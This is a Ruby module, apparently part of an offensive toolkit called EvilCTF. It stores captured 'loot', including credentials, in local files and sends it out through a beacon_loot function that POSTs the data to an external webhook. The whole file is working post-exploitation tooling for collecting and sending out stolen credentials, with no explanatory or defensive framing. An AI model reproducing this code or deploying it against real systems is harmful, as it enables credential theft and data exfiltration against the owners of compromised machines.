# frozen_string_literal: true

require 'fileutils'
require 'json'
require 'net/http'
require 'uri'

module EvilCTF
  module Tools
    module LootStore
      module_function

      def save_loot(matches, event_logfile: nil)
        return if matches.nil? || matches.empty?

        FileUtils.mkdir_p('loot')
        begin
          File.open('loot/loot.txt', 'a') do |f|
            matches.each do |m|
              f.puts(m) unless m.is_a?(String) && m.start_with?('{')
            end
          end

          if event_logfile
            File.open(event_logfile, 'a') do |f|
              matches.each do |m|
                f.puts("[#{Time.now.strftime('%Y-%m-%d %H:%M:%S')}] LOOT #{m}")
              end
            end
          end

          json_loot = if File.exist?('loot/creds.json')
                        JSON.parse(File.read('loot/creds.json'))
                      else
                        []
                      end
          json_loot += matches.select { |m| m.is_a?(String) && m.start_with?('{') }
          json_loot = json_loot.uniq
          File.write('loot/creds.json', JSON.pretty_generate(json_loot))
        rescue Errno::ENOSPC => e
          puts "[!] No space left on device for loot saving: #{e.message}"
        rescue StandardError => e
          puts "[!] Save loot failed: #{e.message}"
        end
      end

      def beacon_loot(webhook, matches)
        return if matches.nil? || matches.empty? || webhook.nil?

        uri = URI(webhook)
        req = Net::HTTP::Post.new(uri)
        req['Content-Type'] = 'application/json'
        req.body = { loot: matches }.to_json
        Net::HTTP.start(uri.hostname, uri.port, use_ssl: uri.scheme == 'https') do |http|
          http.request(req)
        end
      rescue StandardError => e
        puts "[!] Beacon failed: #{e.message}"
      end
    end
  end
end
